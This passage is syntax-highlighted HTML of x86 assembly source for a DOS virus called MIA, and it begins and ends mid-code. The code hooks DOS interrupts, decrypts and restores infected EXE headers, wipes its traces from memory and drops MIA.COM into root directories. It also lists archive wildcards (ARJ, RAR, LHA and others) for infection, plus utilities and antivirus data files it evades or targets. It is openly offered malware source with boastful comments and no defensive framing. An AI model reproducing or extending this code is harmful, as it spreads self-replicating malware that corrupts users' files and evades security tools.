 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store it into entry point</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Next word...</span><span class="sc0">

</span><span class="sc5">Eraser</span><span class="sc4">:</span><span class="sc0">                        
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DI = beginning-of-virus</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Coverlet</span><span class="sc0">               </span><span class="sc1">; Overwrite virus portion with zeros</span><span class="sc0">

</span><span class="sc5">Unclasp</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore all registers</span><span class="sc0">

</span><span class="sc5">Bad_Func</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Request</span><span class="sc0">                </span><span class="sc1">; Return to interrupt caller</span><span class="sc0">

</span><span class="sc5">Inclined</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0">    </span><span class="sc1">; Check entry point...</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Unclasp</span><span class="sc0">                </span><span class="sc1">; Jump if below viral IP</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">000Fh</span><span class="sc0">               </span><span class="sc1">; Viral .EXE's delta offset mustn't be above 15</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Unclasp</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Seamless</span><span class="sc0">               </span><span class="sc1">; Decrypt original .EXE header</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Unclasp</span><span class="sc0">                </span><span class="sc1">; ZF=0 ƒƒƒ file's not infected</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                 </span><span class="sc1">; Get current PSP segment into BX</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ES:DI now points at initial (viral) SS:SP</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Load vector of program's SS:SP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Copy word on top of stack into BP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Adjust</span><span class="sc0">                 </span><span class="sc1">; Adjust Top-Of-Memory field</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get initial SP</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; What the blaze!! adding stack space??</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; (bugfix for MS-DOS that corrupts top word of</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; program's stack)</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Obtain initial SS</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">               </span><span class="sc1">; Add with PSP size in paragraph</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Add with PSP segment</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store it into parameter block</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get initial IP</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Obtain initial CS</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Add with first segment beyond PSP</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Eraser</span><span class="sc0">           </span><span class="sc1">; it'll be initial AX value at program startup</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Dropper's host program ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Program</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Cards</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Program</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10Fh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; Resize host's MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CmdLn</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Program</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">In_SP</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">In_SS</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SP &amp; SS</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; Call COMMAND interpreter</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">               </span><span class="sc1">; Terminate with exit code 0</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0A000h</span><span class="sc0">

</span><span class="sc5">In_SS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Program</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">

</span><span class="sc5">In_SP</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Program</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">CmdLn</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc12">'VER'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
</span><span class="sc5">Cards</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.ARJ'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Wild card for ARJ archives infection purpose</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.LHA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Wild card for LHA archives infection purpose</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.LZH'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Wild card for LZH archives infection purpose</span><span class="sc0">
</span><span class="sc1">;       db '*.MIA',00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.PAK'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Wild card for PAK archives infection purpose</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.RAR'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Wild card for RAR archives infection purpose</span><span class="sc0">
</span><span class="sc1">;       db '*.ZIP',00h</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒ[ Here's the list of suckers (who make MIA paranoid) ]ƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Suckers</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ARJ'</span><span class="sc0">               </span><span class="sc1">; ARJ.EXE - ARJ archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DSK'</span><span class="sc0">               </span><span class="sc1">; CHKDSK.EXE/SPEEDDSK.EXE - disk utilities</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EFR'</span><span class="sc0">               </span><span class="sc1">; DEFRAG.EXE - disk defragmentation utility</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FTP'</span><span class="sc0">               </span><span class="sc1">; FTP.EXE/FTPX.EXE ?????</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IET'</span><span class="sc0">               </span><span class="sc1">; DIET.EXE ??</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KUP'</span><span class="sc0">               </span><span class="sc1">; BACKUP.COM/BACKUP.EXE/MSBACKUP.EXE</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LHA'</span><span class="sc0">               </span><span class="sc1">; LHA.EXE - LHA archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LIX'</span><span class="sc0">               </span><span class="sc1">; TELIX archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LTH'</span><span class="sc0">               </span><span class="sc1">; ASTEALTH.EXE - stealth parasitic virus detector</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LZH'</span><span class="sc0">               </span><span class="sc1">; LZH archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MOD'</span><span class="sc0">               </span><span class="sc1">; MODEM.EXE ???</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NDD'</span><span class="sc0">               </span><span class="sc1">; Norton Disk Doctor??</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RAR'</span><span class="sc0">               </span><span class="sc1">; RAR.EXE - RAR archiver</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UUE'</span><span class="sc0">               </span><span class="sc1">; UUENCODE.EXE</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ZIP'</span><span class="sc0">               </span><span class="sc1">; PKZIP/*ZIP* - ZIP archivers</span><span class="sc0">
</span><span class="sc5">Retro</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ANTI-VIR.DAT'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; ThunderBYTE TbSetup data file</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'command.com'</span><span class="sc0">       </span><span class="sc1">; DOS COMMAND interpreter</span><span class="sc0">
</span><span class="sc5">WinVxD</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\SYSTEM'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\IOSUBSYS'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\HSFLOP.PDR'</span><span class="sc0">       </span><span class="sc1">; MS Windows floppy disk driver file</span><span class="sc0">

</span><span class="sc5">Alloc</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                 </span><span class="sc1">; Low memory first fit</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Low memory best fit</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Low memory last fit</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; High memory first fit (DOS v5.00+)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; High memory best fit (DOS v5.00+)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; High memory last fit (DOS v5.00+)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; First fit, try high then low memory (DOS v5.00+)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">                 </span><span class="sc1">; Best fit, try high then low memory (DOS v5.00+)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0">                 </span><span class="sc1">; Last fit, try high then low memory (DOS v5.00+)</span><span class="sc0">
</span><span class="sc5">Bait</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\MIA.COM'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Dropper filename (backslash indicates in root)</span><span class="sc0">
</span><span class="sc1">;       db "Mia, touch Me tenderly, hug Me warmly, kiss Me sweetly... "</span><span class="sc0">
</span><span class="sc1">;       db "Ohh... imagination feels so fine and the truth hurts like "</span><span class="sc0">
</span><span class="sc1">;       db "hell, if You ain't mine... Mia, Mia, Mia...",00h</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=19h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Internal</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">                 </span><span class="sc1">; Infected program is executed when MIA</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Hurdle</span><span class="sc0">                 </span><span class="sc1">; is already resident.</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Hurdle</span><span class="sc0">                 </span><span class="sc1">; Hey baby, I'm right here waiting! </span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FEEDh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Hurdle</span><span class="sc0">                 </span><span class="sc1">; Yes, this is the real MIA</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Frantic</span><span class="sc0">                </span><span class="sc1">; Restore INT 03h and dispatch INT 24h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Backbreak</span><span class="sc0">              </span><span class="sc1">; Restore extended BREAK state</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">                </span><span class="sc1">; Patch INT 21h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; We won't return to caller, so clean up stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; Copy relocation constant into BX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">000Ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; SI = offset of original header in infected file</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; Make BP zero</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">; Copy original header to virus buffer </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Coverlet</span><span class="sc0">               </span><span class="sc1">; Erase virus traces in memory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Undress</span><span class="sc0">                </span><span class="sc1">; Decrypt original file header, *yawn*</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Overlap</span><span class="sc0">

</span><span class="sc5">Verify</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">               </span><span class="sc1">; IOCTL - get handle BX infos</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Test, device handle or file handle?</span><span class="sc0">
 </span><span class="sc6">cmc</span><span class="sc0">                           </span><span class="sc1">; Complementary carry, toggle CF state</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Fearsome</span><span class="sc0">               </span><span class="sc1">; Branch if device</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">               </span><span class="sc1">; Get file date/time stamps</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Fearsome</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Unarchive</span><span class="sc0">              </span><span class="sc1">; Some babe!</span><span class="sc0">

</span><span class="sc5">Fearsome</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Device</span><span class="sc0">                 </span><span class="sc1">; Jump if not file handle</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Device</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">                     </span><span class="sc1">; Never return, so clean up stack</span><span class="sc0">

</span><span class="sc5">Hurdle</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Clueless</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=0Eh dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; When an attempt to change current drive is made by DOS,  MIA intercepts it,</span><span class="sc0">
</span><span class="sc1">; calling the original function,  and tries to drop a file named  MIA.COM  in</span><span class="sc0">
</span><span class="sc1">; root directory, if this doesn't stall, MIA just infects that file. The file</span><span class="sc0">
</span><span class="sc1">; is needed by MIA when trying to infect ARJ/LHA/LZH/PAK/RAR archives.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Dropper</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; function AH=3Bh will destroy it</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Change drive/directory</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">                         
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Must be a valid drive</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Surpass</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">                 </span><span class="sc1">; Get free disk space</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">                           </span><span class="sc1">; DL = zero = in current drive</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">        </span><span class="sc1">; BX = total free clusters on disk</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Surpass</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6C00h</span><span class="sc0">               </span><span class="sc1">; Create a new file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1002h</span><span class="sc0">
